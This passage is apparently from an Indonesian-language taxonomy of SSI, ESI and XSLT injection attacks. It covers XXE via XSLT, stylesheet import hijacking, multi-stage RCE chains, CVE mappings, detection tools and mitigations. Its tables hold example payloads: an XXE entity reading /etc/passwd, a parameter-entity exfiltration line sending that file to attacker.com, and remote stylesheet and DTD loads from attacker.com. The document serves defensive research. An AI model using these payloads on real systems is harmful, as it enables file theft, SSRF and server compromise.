| **Cron/scheduled task injection** | Menulis ke direktori cron atau lokasi Windows Task Scheduler | Target `/etc/cron.d/`, `/var/spool/cron/` | Izin tulis level root |

**Dukungan processor:** Output `document` EXSLT terutama didukung oleh **libxslt**. Saxon dan Xalan menggunakan mekanisme berbeda untuk output sekunder (`xsl:result-document` di XSLT 2.0+).

### §3-5. XML External Entity (XXE) via XSLT

Stylesheet XSLT adalah dokumen XML, menjadikannya rentan terhadap serangan XXE melalui deklarasi DOCTYPE.

| Subtipe | Mekanisme | Contoh | Kondisi Utama |
|---------|-----------|---------|---------------|
| **Classic XXE file read** | Mendefinisikan external entity yang merujuk file lokal | `<!DOCTYPE xsl:stylesheet [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` ... `&xxe;` | XML parser XSLT processor menyelesaikan external entity |
| **SSRF via XXE** | External entity merujuk URL HTTP | `<!ENTITY xxe SYSTEM "http://internal-server/admin">` | Resolusi URL eksternal diaktifkan |
| **Parameter entity exfiltration** | Menggunakan parameter entity untuk eksfiltrasi data out-of-band | `<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%file;'>">` | OOB channel; pemrosesan parameter entity |
| **Billion Laughs (DoS)** | Ekspansi entity bersarang yang menyebabkan konsumsi memori eksponensial | `<!ENTITY lol1 "&lol;&lol;&lol;...">` dst. | Batas ekspansi entity tidak dikonfigurasi |
| **DTD-based SSRF** | Memaksa parser mengambil file DTD jarak jauh | `<!DOCTYPE xsl:stylesheet SYSTEM "http://attacker.com/evil.dtd">` | Pemuatan DTD jarak jauh tidak dinonaktifkan |

**Amplifikasi XXE + XSLT:** Kombinasi XXE dengan XSLT sangat kuat karena fungsi `document()` XSLT dapat digunakan untuk memuat XML eksternal yang sendiri berisi deklarasi XXE, menciptakan rantai eksploitasi multi-tahap.

### §3-6. Pembajakan Import dan Include Stylesheet

XSLT mendukung komposisi stylesheet modular melalui `xsl:import` dan `xsl:include`, yang dapat dibajak untuk memuat logika transformasi yang dikontrol penyerang.

| Subtipe | Mekanisme | Contoh | Kondisi Utama |
|---------|-----------|---------|---------------|
| **Remote stylesheet import** | `xsl:import` memuat stylesheet jarak jauh dengan aturan precedence yang lebih rendah | `<xsl:import href="http://attacker.com/evil.xsl"/>` | Resolusi URI tidak dibatasi |
| **Remote stylesheet include** | `xsl:include` memuat stylesheet jarak jauh seolah-olah inline | `<xsl:include href="http://attacker.com/evil.xsl"/>` | Resolusi URI tidak dibatasi |
| **Relative path hijacking** | Memanipulasi path import/include relatif untuk memuat stylesheet lokal yang tidak diinginkan | Path traversal dalam atribut `href` | Manipulasi base URI dimungkinkan |
| **Import precedence exploitation** | Menggunakan aturan import precedence untuk mengoverride perilaku template yang kritis terhadap keamanan | Stylesheet yang diimpor mendefinisikan ulang template yang menangani operasi sensitif | Aplikasi mengandalkan template precedence untuk kontrol akses |

### §3-7. Manipulasi Output Method dan Serialisasi

Elemen `xsl:output` XSLT mengontrol bagaimana hasil transformasi diserialisasi, yang dapat dieksploitasi untuk mengubah interpretasi respons.

| Subtipe | Mekanisme | Contoh | Kondisi Utama |
|---------|-----------|---------|---------------|
| **Content-Type manipulation** | Mengubah `media-type` dalam `xsl:output` untuk mengubah interpretasi konten browser | `<xsl:output method="html" media-type="text/html"/>` | Processor mengoutput header Content-Type berdasarkan `xsl:output` |
| **Encoding manipulation** | Mengubah encoding output untuk mengaktifkan serangan berbasis character-set | `<xsl:output encoding="UTF-7"/>` | Consumer downstream menginterpretasikan encoding yang diubah |
| **CDATA injection** | Menggunakan `cdata-section-elements` untuk memaksa pembungkusan CDATA, mem-bypass HTML escaping | `<xsl:output cdata-section-elements="script"/>` | Output dikonsumsi sebagai HTML |

---

## §4. Chaining Lintas Teknologi

Serangan yang paling berdampak menggabungkan beberapa teknologi injeksi menjadi rantai eksploitasi multi-tahap.

### §4-1. Rantai ESI → XSLT → RCE

| Tahap | Mekanisme | Prasyarat |
|-------|-----------|-------------|
| 1. Injeksi ESI | Suntikkan `<esi:include>` dengan parameter `dca="xslt"` | Input pengguna direfleksikan dalam respons yang diproses ESI |
| 2. Pengiriman XSLT stylesheet | Surrogate mengambil file `.xsl` yang dikontrol penyerang via atribut `stylesheet` | Tidak ada host whitelist, atau bypass whitelist |
| 3. RCE extension function | Stylesheet XSLT berisi panggilan extension function Java Xalan/Saxon | Java-based XSLT processor dengan ekstensi diaktifkan |

Rantai ini mengescalasi dari injeksi lapisan cache (biasanya terbatas pada SSRF/XSS) ke eksekusi kode sisi server penuh.

### §4-2. SSI → File Include → Eksekusi Kode

| Tahap | Mekanisme | Prasyarat |
|-------|-----------|-------------|
| 1. Injeksi SSI | Suntikkan direktif `<!--#include virtual="...">` | Input pengguna dalam halaman yang diproses SSI |
| 2. File inclusion | Sertakan file yang berisi konten yang dapat dieksekusi (PHP, JSP, dll.) | Penyerang dapat mengunggah atau mengontrol file di server |
| 3. Eksekusi kode | File yang disertakan diproses oleh interpreter bahasa aplikasi | Path yang disertakan memicu eksekusi handler (misalnya, ekstensi `.php`) |

### §4-3. XSLT → XXE → SSRF → Akses Internal

| Tahap | Mekanisme | Prasyarat |
|-------|-----------|-------------|
| 1. Injeksi XSLT | Suntikkan atau suplai XSLT stylesheet berbahaya | Input stylesheet yang dikontrol pengguna |
| 2. Deklarasi XXE | Stylesheet berisi DOCTYPE dengan external entity yang merujuk layanan internal | XML parser menyelesaikan external entity |
| 3. SSRF ke metadata | Entity diselesaikan ke endpoint cloud metadata atau API internal | XSLT processor berjalan di lingkungan cloud dengan akses layanan metadata |

### §4-4. XSLT → File Write → Webshell → RCE Persisten

| Tahap | Mekanisme | Prasyarat |
|-------|-----------|-------------|
| 1. Injeksi XSLT | Suntikkan stylesheet dengan elemen output EXSLT `document` | Stylesheet yang dikontrol pengguna; processor libxslt |
| 2. Penulisan webshell | Tulis file PHP/JSP/ASP ke direktori yang dapat diakses web | Izin tulis; path web root diketahui |
| 3. Akses persisten | Akses webshell yang ditulis via HTTP untuk mengeksekusi perintah arbitrer | Path webshell dapat diakses via web |

### §4-5. SSRF → XSLT Endpoint → RCE (Pola CVE-2025-61882)

| Tahap | Mekanisme | Prasyarat |
|-------|-----------|-------------|
| 1. SSRF via endpoint tanpa autentikasi | Kirim request yang dibuat ke endpoint yang membuat HTTP call sisi server | SSRF tanpa autentikasi dalam aplikasi web |
| 2. Injeksi CRLF untuk request smuggling | Suntikkan urutan CRLF untuk memanipulasi struktur HTTP request internal | Parameter URL rentan terhadap injeksi CRLF |
| 3. Pemuatan XSLT stylesheet | Request yang dimanipulasi mencapai endpoint pemrosesan XSLT yang memuat stylesheet dari URL yang dikontrol penyerang (via injeksi Host header) | Endpoint XSLT membangun URL stylesheet dari request header |
| 4. RCE extension function Java | Stylesheet XSLT yang disajikan penyerang menggunakan extension function Java untuk eksekusi kode | Java XSLT processor dengan ekstensi diaktifkan |

Pola ini, yang dicontohkan oleh CVE-2025-61882 di Oracle E-Business Suite, mendemonstrasikan bagaimana endpoint pemrosesan XSLT yang tidak langsung menghadapi pengguna masih dapat dijangkau dan dieksploitasi melalui rantai SSRF.

---

## §5. Pemetaan Skenario Serangan (Sumbu 3)

| Skenario Dampak | Arsitektur / Kondisi | Kategori Mutasi Utama |
|----------------|--------------------------|---------------------------|
| **Remote Code Execution** | SSI exec diaktifkan; XSLT dengan ekstensi; rantai ESI+XSLT | §1-1, §3-3 (semua subbagian), §3-4, §2-6, §4-1, §4-5 |
| **Pembacaan File Arbitrer** | SSI include; XSLT document(); XSLT XXE | §1-2, §3-2, §3-5 |
| **Server-Side Request Forgery** | ESI include; XSLT document(); XSLT XXE; SSI include virtual | §2-1, §3-2, §3-5, §1-2 |
| **Session Hijacking (Pencurian Cookie)** | ESI vars dengan akses cookie; SSI echo HTTP_COOKIE | §2-2, §1-3 |
| **Cross-Site Scripting / Bypass Filter** | Pemisahan komentar ESI; konstruksi variabel ESI; injeksi output SSI | §2-3, §2-4 |
| **Cache Poisoning** | Penimpaan fragmen inline ESI; manipulasi header ESI | §2-5, §2-4 |
| **Backdoor Persisten** | Penulisan file XSLT (webshell); poisoning JavaScript inline ESI | §3-4, §2-5, §4-4 |
| **Denial of Service** | Penyertaan rekursif ESI; Billion Laughs XSLT; crash parser Squid | §2-7, §3-5 |
| **Fingerprinting Server** | SSI printenv/echo; XSLT system-property | §1-3, §3-1 |

---

## §6. Pemetaan CVE / Kasus Nyata

| Kombinasi Mutasi | CVE / Kasus | Dampak | Tahun |
|---------------------|-----------|--------|------|
| §4-5 (SSRF → CRLF → XSLT RCE) | CVE-2025-61882 (Oracle E-Business Suite) | RCE Kritis (CVSS 9.8), dieksploitasi di dunia nyata oleh kelompok ransomware Cl0p | 2025 |
| §2-7 (ESI recursive inclusion DoS) | CVE-2025-49763 (Apache Traffic Server) | Remote DoS via kelelahan memori (CVSS 7.5) | 2025 |
| §3-3b + §3-6 (unggah XSLT → RCE) | CVE-2023-46214 (Splunk Enterprise) | Authenticated RCE via unggah XSLT berbahaya (CVSS 8.0) | 2023 |
| §3-5 (XSLT XXE) + §3-3 | CVE-2024-28109 (veraPDF) | RCE via injeksi XSLT dalam pemrosesan schematron pengecekan kebijakan | 2024 |
| §3-3b (XSLT Java extension RCE) | HtmlUnit GHSA-37vq-hr2f-g7h7 | RCE via XSLT saat menjelajahi halaman web penyerang (FEATURE_SECURE_PROCESSING tidak diaktifkan) | 2024 |
| §2-7 (crash parser ESI) | CVE-2024-45802 (Squid) | DoS via out-of-bounds write dalam penanganan variabel ESI | 2024 |
| §2-7 (crash parser ESI) | CVE-2018-1000024, CVE-2018-1000027 (Squid) | DoS via kesalahan penanganan pointer dalam pemrosesan ESI | 2018 |
| §2-4 (injeksi header ESI) | CVE-2019-2438 (Oracle WebCache) | SSRF via override Host header `esi:request_header` | 2019 |
| §3-3d (RCE skrip .NET) + §3-5 | CVE-2022-22834, CVE-2022-22835 (OverIT Framework) | Injeksi XSLT + XXE yang berujung RCE | 2022 |
| §2-2 (pencurian cookie ESI) | HackerOne #1073780 | Pengambilalihan akun via ekstraksi cookie sesi berbasis ESI | — |
| §3-3b (Xalan Java extension RCE) | EktronCMS Saxon XSLT RCE | RCE via XSLT yang disuplai penyerang yang diproses oleh parser Saxon | — |
| §3-3 (XSLT extension functions) | 6 CVE dari riset XDV (makalah 2025) | Beberapa RCE injeksi XSLT dalam proyek Java open-source | 2025 |

---

## §7. Alat Deteksi dan Scanner

| Alat | Tipe | Cakupan Target | Teknik Inti |
|------|------|-------------|---------------|
| **ZAP (OWASP)** | Scanner | Deteksi injeksi XSLT (Alert ID 90017) | Active scan dengan payload injeksi XSLT; memeriksa pengungkapan system-property |
| **Acunetix** | Scanner | Injeksi SSI, injeksi XSLT, injeksi ESI | Injeksi payload otomatis dengan analisis respons |
| **Invicti (Netsparker)** | Scanner | Injeksi XSLT | Deteksi endpoint pemrosesan XSLT dengan pengujian injeksi |
| **Nuclei** | Scanner (berbasis template) | SSI/ESI/XSLT via template komunitas | Template deteksi berbasis YAML untuk pola yang diketahui |
| **Burp Suite** | Proxy/Scanner | Deteksi injeksi SSI/ESI | Deteksi pasif via response header (`Surrogate-Control: content="ESI/1.0"`); pengujian injeksi aktif |
| **XDV** | Static analyzer | Kerentanan XSLT dalam proyek Java | Analisis taint berbasis CodeQL dari input pengguna ke sink pemrosesan XSLT (riset 2025) |
| **tplmap** | Alat eksploitasi | Injeksi SSI (+ SSTI) | Generasi payload SSI otomatis dan eksploitasi |
| **Semgrep** | SAST | Sink injeksi XSLT | Aturan untuk mendeteksi penggunaan `TransformerFactory` yang tidak aman dan `FEATURE_SECURE_PROCESSING` yang hilang |
| **Splunk ESCU** | Aturan deteksi | CVE-2023-46214 | Mendeteksi upaya eksploitasi Splunk XSLT RCE |
| **ModSecurity CRS** | WAF | Pola injeksi ESI/SSI | Set aturan yang mendeteksi injeksi berbasis XML dan pola direktif SSI |

---

## §8. Referensi Mitigasi dan Konfigurasi Aman

### Mitigasi SSI

| Kontrol | Implementasi | Efek |
|---------|---------------|--------|
| Nonaktifkan `exec` | Apache: `Options +IncludesNOEXEC` | Mengizinkan SSI tetapi memblokir `exec cmd` dan `exec cgi` |
| Nonaktifkan SSI sepenuhnya | Apache: hapus `+Includes` dari `Options` | Menghilangkan semua pemrosesan SSI |
| Batasi ekstensi file | Hanya aktifkan SSI untuk file `.shtml`, bukan `.html` | Mengurangi cakupan pemrosesan SSI |
| Sanitasi input | Hapus atau encode urutan `<!--#` dari input pengguna | Mencegah injeksi direktif |
| Pembatasan SSI Nginx | `ssi off;` dalam blok location | Menonaktifkan SSI per-location |

### Mitigasi ESI

| Kontrol | Implementasi | Efek |
|---------|---------------|--------|
| Nonaktifkan pemrosesan ESI | Hapus konfigurasi ESI dari surrogate | Menghilangkan permukaan serangan ESI sepenuhnya |
| Host whitelisting | Konfigurasi `esi:include` src agar hanya mengizinkan asal tepercaya | Mencegah SSRF ke host arbitrer |
| Escaping input | HTML/XML-escape input pengguna sebelum mencapai respons yang diproses ESI | Mencegah injeksi tag ESI |
| Nonaktifkan `dca="xslt"` | Hapus dukungan XSLT dari konfigurasi ESI | Memblokir rantai eskalasi ESI→XSLT |
| Batas kedalaman penyertaan | Konfigurasi kedalaman nesting maksimum untuk `esi:include` | Mencegah DoS penyertaan rekursif (patch untuk CVE-2025-49763) |
| Upgrade surrogate | Pertahankan versi terkini Squid, Varnish, ATS | Menambal crash parser dan memory corruption yang diketahui |

### Mitigasi XSLT

| Kontrol | Implementasi | Efek |
|---------|---------------|--------|
| `FEATURE_SECURE_PROCESSING` | Java: `tf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)` | Mengaktifkan pembatasan keamanan pada XSLT processor |
| Nonaktifkan extension function | Java: `tf.setAttribute("http://javax.xml.XMLConstants/property/accessExternalStylesheet", "")` | Memblokir pemuatan stylesheet jarak jauh |
| Nonaktifkan `registerPHPFunctions` | PHP: jangan panggil `$xslt->registerPHPFunctions()` | Mencegah pemanggilan fungsi PHP dari XSLT |
| Nonaktifkan `msxsl:script` | .NET: gunakan `XsltSettings.Default` (bukan `TrustedXslt`) | Memblokir eksekusi skrip C#/VB.NET/JScript |
| Nonaktifkan external entity | Konfigurasi XML parser untuk menolak DTD dan external entity | Memblokir XXE melalui XSLT |
| Tolak XSLT pengguna | Jangan pernah menerima XSLT stylesheet yang disuplai pengguna atau mengizinkan injeksi ke konten stylesheet | Menghilangkan vektor injeksi sepenuhnya |
| Allowlist namespace ekstensi | Hanya izinkan namespace ekstensi yang spesifik dan telah diaudit | Membatasi permukaan serangan extension function |
| `XSLTAccessControl` (lxml) | Python: konfigurasi `XSLTAccessControl` untuk membatasi I/O | Mengontrol akses file/jaringan dari XSLT |

---

## §9. Ringkasan: Prinsip Inti

**Properti fundamental yang membuat injeksi SSI/ESI/XSLT mungkin terjadi adalah sama di ketiga teknologi: pemrosesan sisi server dari direktif markup dalam aliran konten yang dapat dipengaruhi oleh input pengguna.** Dalam setiap kasus, mesin pemrosesan — apakah itu parser SSI web server, mesin ESI cache surrogate, atau XSLT processor aplikasi — menginterpretasikan markup khusus dalam badan respons, dan batas antara "markup tepercaya" dan "konten yang dikontrol pengguna" tidak ada atau tidak ditegakkan secara memadai.

Alasan mengapa **patch inkremental gagal** menghilangkan ancaman ini bersifat struktural: setiap teknologi dirancang dengan asumsi bahwa konten yang diproses berasal dari sumber tepercaya. SSI mengasumsikan pengembang web mengontrol semua konten `.shtml`. ESI secara eksplisit mempercayai semua respons upstream karena surrogate tidak memiliki mekanisme untuk membedakan ESI sah dari ESI yang disuntikkan. XSLT processor mengekspos extension function karena dirancang untuk pipeline transformasi tepercaya, bukan pemrosesan input adversarial. Ketika asumsi-asumsi ini rusak — ketika input pengguna mencapai mesin pemrosesan ini — kekuatan penuh teknologi tersebut menjadi tersedia bagi penyerang.

**Solusi struktural** memerlukan defense-in-depth di tiga lapisan: (1) **penegakan batas input** — memastikan data yang dikontrol pengguna tidak pernah mencapai mesin pemrosesan SSI/ESI/XSLT tanpa sanitasi yang ketat; (2) **pembatasan kemampuan** — menonaktifkan fitur berbahaya (`exec` SSI, extension function XSLT, `dca="xslt"` ESI) yang tidak diperlukan oleh aplikasi; dan (3) **isolasi pemrosesan** — menjalankan mesin transformasi dengan hak akses minimal dan akses jaringan/filesystem yang dibatasi, sehingga bahkan injeksi yang berhasil pun memiliki dampak terbatas. Pendekatan paling efektif adalah **menghilangkan pemrosesan sepenuhnya** ketika tidak diperlukan — nonaktifkan SSI jika dynamic include tidak digunakan, hapus konfigurasi ESI dari surrogate yang tidak memerlukannya, dan tolak XSLT stylesheet yang disuplai pengguna di batas aplikasi.

---

## Referensi

- CWE-97: Improper Neutralization of Server-Side Includes (SSI) Within a Web Page — https://cwe.mitre.org/data/definitions/97.html
- OWASP SSI Injection — https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection
- Apache mod_include documentation — https://httpd.apache.org/docs/current/mod/mod_include.html
- ESI Language Specification 1.0 — W3C Note
- GoSecure ESI Injection Research (Black Hat USA 2018 / DEF CON 26) — Edge Side Include Injection: Abusing Caching Servers into SSRF and Transparent Session Hijacking
- h3xStream ESI Injection Part 2: Abusing Specific Implementations (2019) — http://blog.h3xstream.com/2019/05/esi-injection-part-2-abusing-specific.html
- PayloadsAllTheThings XSLT Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md
- Li, Luo, Liu — "Detecting and Exploiting XSLT Vulnerabilities in Real-World Open Source Projects" (2025) — https://ssrn.com/abstract=5337829
- Oracle JAXP Security Guide — https://docs.oracle.com/en/java/javase/11/security/java-api-xml-processing-jaxp-security-guide.html
- Microsoft CA3076: Insecure XSLT Script Execution — https://learn.microsoft.com/en-us/dotnet/fundamentals/code-analysis/quality-rules/ca3076
- Saxon Documentation: xsl:evaluate — https://www.saxonica.com/html/documentation12/xsl-elements/evaluate.html
- Saxonica: Reflexive Extension Functions — https://www.saxonica.com/html/documentation10/extensibility/functions/index.html
- HackTricks: Server Side Inclusion/Edge Side Inclusion Injection — https://book.hacktricks.wiki/pentesting-web/server-side-inclusion-edge-side-inclusion-injection.html
- SideChannel: Understanding the Edge Side Include Injection Vulnerability — https://www.sidechannel.blog/en/understanding-the-edge-side-include-injection-vulnerability/
- CVE-2025-61882: Oracle E-Business Suite Zero-Day RCE — https://www.centripetal.ai/threat-research/oracle-e-business-suite-zero-day-enables-remote-code-execution
- CVE-2025-49763: Apache Traffic Server ESI Plugin DoS — https://www.imperva.com/blog/cve-2025-49763-remote-dos-via-memory-exhaustion-in-apache-traffic-server-via-esi-plugin/
- CVE-2023-46214: Splunk Enterprise RCE via XSLT — https://advisory.splunk.com/advisories/SVD-2023-1104
- CVE-2024-45802: Squid ESI Processing DoS — https://github.com/squid-cache/squid/security/advisories/GHSA-f975-v7qw-q7hj
- CVE-2024-28109: veraPDF XSLT Injection — https://github.com/veraPDF/veraPDF-library/security/advisories/GHSA-qxqf-2mfx-x8jw
- HtmlUnit XSLT RCE — https://github.com/HtmlUnit/htmlunit/security/advisories/GHSA-37vq-hr2f-g7h7
- INE: XSLT Injection Attacks — https://ine.com/blog/xslt-injections-for-dummies

---

*Dokumen ini dibuat untuk tujuan riset keamanan defensif dan pemahaman kerentanan.*